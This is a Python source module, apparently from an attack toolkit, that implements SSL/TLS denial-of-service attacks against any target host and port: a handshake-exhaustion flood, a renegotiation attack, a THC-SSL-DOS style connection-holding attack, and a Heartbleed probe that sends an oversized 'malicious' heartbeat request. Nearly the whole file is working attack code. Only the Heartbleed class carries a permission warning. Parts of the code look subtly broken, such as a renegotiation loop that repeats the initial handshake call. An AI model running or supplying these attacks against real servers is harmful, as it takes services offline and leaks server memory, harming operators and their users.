"""
SSL/TLS Attack Module

Implements SSL/TLS specific attacks:
- SSL Exhaustion (CPU exhaustion via handshakes)
- SSL Renegotiation attack
- Heartbleed test (CVE-2014-0160)
"""

import asyncio
import socket
import ssl
import struct
import time
import random
from dataclasses import dataclass, field
from typing import Dict, Any, Optional, List
import logging

logger = logging.getLogger(__name__)


@dataclass
class SSLConfig:
    """Configuration for SSL attacks"""
    target: str
    port: int = 443
    duration: int = 60
    connections: int = 100
    rate_limit: int = 100


@dataclass
class SSLStats:
    """Statistics for SSL attacks"""
    handshakes_initiated: int = 0
    handshakes_completed: int = 0
    renegotiations: int = 0
    errors: int = 0
    bytes_sent: int = 0
    start_time: float = field(default_factory=time.time)


class SSLExhaustion:
    """
    SSL Exhaustion Attack
    
    Exhausts server CPU by initiating many SSL handshakes.
    SSL handshakes are computationally expensive for servers.
    """
    
    def __init__(self, config: SSLConfig):
        self.config = config
        self.stats = SSLStats()
        self._running = False
        
    async def start(self):
        """Start SSL exhaustion attack"""
        self._running = True
        self.stats = SSLStats()
        
        logger.info(f"Starting SSL exhaustion on {self.config.target}:{self.config.port}")
        
        tasks = []
        for _ in range(self.config.connections):
            task = asyncio.create_task(self._worker())
            tasks.append(task)
            
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
            
        self._running = False
        logger.info(f"SSL exhaustion complete. Handshakes: {self.stats.handshakes_initiated}")
        
    async def stop(self):
        """Stop the attack"""
        self._running = False
        
    async def _worker(self):
        """Worker that initiates SSL handshakes"""
        interval = 1.0 / (self.config.rate_limit / self.config.connections)
        
        while self._running:
            try:
                # Create SSL context with expensive cipher suites
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                # Prefer expensive cipher suites
                ssl_context.set_ciphers('DHE-RSA-AES256-SHA:DHE-DSS-AES256-SHA:AES256-SHA')
                
                # Open connection
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        self.config.target, 
                        self.config.port,
                        ssl=ssl_context
                    ),
                    timeout=10
                )
                
                self.stats.handshakes_initiated += 1
                self.stats.handshakes_completed += 1
                
                # Close immediately to force new handshake
                writer.close()
                await writer.wait_closed()
                
            except ssl.SSLError as e:
                self.stats.handshakes_initiated += 1
                self.stats.errors += 1
            except Exception as e:
                self.stats.errors += 1
                
            await asyncio.sleep(interval)
            
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        elapsed = time.time() - self.stats.start_time
        return {
            'handshakes_initiated': self.stats.handshakes_initiated,
            'handshakes_completed': self.stats.handshakes_completed,
            'handshakes_per_second': self.stats.handshakes_initiated / elapsed if elapsed > 0 else 0,
            'errors': self.stats.errors,
        }


class SSLRenegotiation:
    """
    SSL Renegotiation Attack
    
    Exploits SSL renegotiation to exhaust server resources.
    Each renegotiation requires expensive crypto operations.
    
    Note: Many servers have disabled renegotiation.
    """
    
    def __init__(self, config: SSLConfig, renegotiations_per_conn: int = 100):
        self.config = config
        self.renegotiations_per_conn = renegotiations_per_conn
        self.stats = SSLStats()
        self._running = False
        
    async def start(self):
        """Start SSL renegotiation attack"""
        self._running = True
        self.stats = SSLStats()
        
        logger.info(f"Starting SSL renegotiation on {self.config.target}:{self.config.port}")
        
        tasks = []
        for _ in range(self.config.connections):
            task = asyncio.create_task(self._worker())
            tasks.append(task)
            
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
            
        self._running = False
        
    async def stop(self):
        """Stop the attack"""
        self._running = False
        
    async def _worker(self):
        """Worker that performs renegotiations"""
        while self._running:
            try:
                # Create raw socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.config.target, self.config.port))
                
                # Wrap with SSL
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                ssl_sock = ssl_context.wrap_socket(sock, server_hostname=self.config.target)
                
                self.stats.handshakes_completed += 1
                
                # Attempt renegotiations
                for _ in range(self.renegotiations_per_conn):
                    if not self._running:
                        break
                        
                    try:
                        # Request renegotiation
                        # Note: This may not work on all servers
                        ssl_sock.do_handshake()
                        self.stats.renegotiations += 1
                    except ssl.SSLError:
                        break
                        
                    await asyncio.sleep(0.01)
                    
                ssl_sock.close()
                
            except Exception as e:
                self.stats.errors += 1
                
            await asyncio.sleep(0.1)
            
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        elapsed = time.time() - self.stats.start_time
        return {
            'handshakes_completed': self.stats.handshakes_completed,
            'renegotiations': self.stats.renegotiations,
            'renegotiations_per_second': self.stats.renegotiations / elapsed if elapsed > 0 else 0,
            'errors': self.stats.errors,
        }


class HeartbleedTest:
    """
    Heartbleed Vulnerability Test (CVE-2014-0160)
    
    Tests if server is vulnerable to Heartbleed.
    This is a DETECTION tool, not an exploit.
    
    WARNING: Only use on systems you own or have permission to test.
    """
    
    # TLS record types
    TLS_HANDSHAKE = 0x16
    TLS_HEARTBEAT = 0x18
    
    # TLS versions
    TLS_1_0 = 0x0301
    TLS_1_1 = 0x0302
    TLS_1_2 = 0x0303
    
    def __init__(self, target: str, port: int = 443):
        self.target = target
        self.port = port
        self.vulnerable = None
        
    async def test(self) -> Dict[str, Any]:
        """
        Test for Heartbleed vulnerability.
        
        Returns:
            Dict with 'vulnerable' (bool) and 'details' (str)
        """
        logger.info(f"Testing {self.target}:{self.port} for Heartbleed")
        
        try:
            # Connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            
            # Send ClientHello
            client_hello = self._build_client_hello()
            sock.send(client_hello)
            
            # Receive ServerHello
            response = sock.recv(4096)
            if not response:
                return {'vulnerable': False, 'details': 'No response to ClientHello'}
                
            # Send Heartbeat request with oversized length
            heartbeat = self._build_heartbeat()
            sock.send(heartbeat)
            
            # Check response
            sock.settimeout(3)
            try:
                response = sock.recv(65535)
                
                if len(response) > 24:
                    # Got more data than expected - vulnerable!
                    self.vulnerable = True
                    return {
                        'vulnerable': True,
                        'details': f'Server returned {len(response)} bytes - VULNERABLE',
                        'leaked_bytes': len(response) - 24
                    }
                else:
                    self.vulnerable = False
                    return {'vulnerable': False, 'details': 'Server not vulnerable'}
                    
            except socket.timeout:
                self.vulnerable = False
                return {'vulnerable': False, 'details': 'No heartbeat response - likely patched'}
                
        except Exception as e:
            return {'vulnerable': None, 'details': f'Test failed: {e}'}
        finally:
            try:
                sock.close()
            except Exception:
                pass
                
    def _build_client_hello(self) -> bytes:
        """Build TLS ClientHello message"""
        # Simplified ClientHello
        random_bytes = bytes(random.randint(0, 255) for _ in range(32))
        
        # Cipher suites
        cipher_suites = struct.pack('>H', 0x0033)  # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
        
        # Extensions (including heartbeat)
        heartbeat_ext = struct.pack('>HHB', 0x000f, 1, 1)  # Heartbeat extension
        
        # Build handshake
        client_hello = (
            struct.pack('>H', self.TLS_1_0) +  # Version
            random_bytes +                       # Random
            b'\x00' +                            # Session ID length
            struct.pack('>H', 2) + cipher_suites +  # Cipher suites
            b'\x01\x00' +                        # Compression methods
            struct.pack('>H', len(heartbeat_ext)) + heartbeat_ext  # Extensions
        )
        
        # Wrap in handshake message
        handshake = struct.pack('>B', 1) + struct.pack('>I', len(client_hello))[1:] + client_hello
        
        # Wrap in TLS record
        record = struct.pack('>BHH', self.TLS_HANDSHAKE, self.TLS_1_0, len(handshake)) + handshake
        
        return record
        
    def _build_heartbeat(self) -> bytes:
        """Build malicious heartbeat request"""
        # Heartbeat request with oversized length
        # Type: 1 (request), Length: 16384 (but only 1 byte of data)
        heartbeat_payload = struct.pack('>BH', 1, 16384) + b'X'
        
        # Wrap in TLS record
        record = struct.pack('>BHH', self.TLS_HEARTBEAT, self.TLS_1_0, len(heartbeat_payload)) + heartbeat_payload
        
        return record


class THCSSLDoS:
    """
    THC-SSL-DOS Style Attack
    
    Combines SSL renegotiation with connection holding
    to maximize server CPU usage.
    """
    
    def __init__(self, config: SSLConfig):
        self.config = config
        self.stats = SSLStats()
        self._running = False
        self._connections: List = []
        
    async def start(self):
        """Start THC-SSL-DOS attack"""
        self._running = True
        self.stats = SSLStats()
        
        logger.info(f"Starting THC-SSL-DOS on {self.config.target}:{self.config.port}")
        
        tasks = []
        for _ in range(self.config.connections):
            task = asyncio.create_task(self._worker())
            tasks.append(task)
            
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
            
        self._running = False
        
    async def stop(self):
        """Stop the attack"""
        self._running = False
        
    async def _worker(self):
        """Worker that maintains SSL connections with renegotiation"""
        while self._running:
            try:
                # Create connection
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        self.config.target,
                        self.config.port,
                        ssl=ssl_context
                    ),
                    timeout=10
                )
                
                self.stats.handshakes_completed += 1
                
                # Send HTTP request to keep connection alive
                request = f"GET / HTTP/1.1\r\nHost: {self.config.target}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                
                # Hold connection and periodically send data
                while self._running:
                    try:
                        # Send keep-alive data
                        writer.write(b'\r\n')
                        await writer.drain()
                        self.stats.bytes_sent += 2
                        
                        await asyncio.sleep(1)
                    except Exception:
                        break
                        
                writer.close()
                await writer.wait_closed()
                
            except Exception:
                self.stats.errors += 1
                await asyncio.sleep(0.5)
                
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        elapsed = time.time() - self.stats.start_time
        return {
            'handshakes_completed': self.stats.handshakes_completed,
            'bytes_sent': self.stats.bytes_sent,
            'errors': self.stats.errors,
        }
